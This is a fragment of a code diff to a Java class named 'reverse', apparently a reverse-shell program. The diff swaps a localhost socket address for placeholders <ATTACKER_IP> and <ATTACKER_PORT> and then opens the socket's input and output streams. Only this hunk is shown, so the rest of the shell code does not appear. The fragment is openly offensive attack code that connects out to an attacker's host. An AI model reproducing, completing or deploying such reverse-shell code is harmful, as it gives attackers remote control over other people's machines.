@@ -4,7 +4,7 @@ import java.net.Socket;
 public class reverse {
     public static void main(String [] args){
         try {
-            Socket socket = new Socket("127.0.0.1", 8080);
+            Socket socket = new Socket(<ATTACKER_IP>, <ATTACKER_PORT>);
 
             InputStream socket_input = socket.getInputStream();
             OutputStream socket_output = socket.getOutputStream();
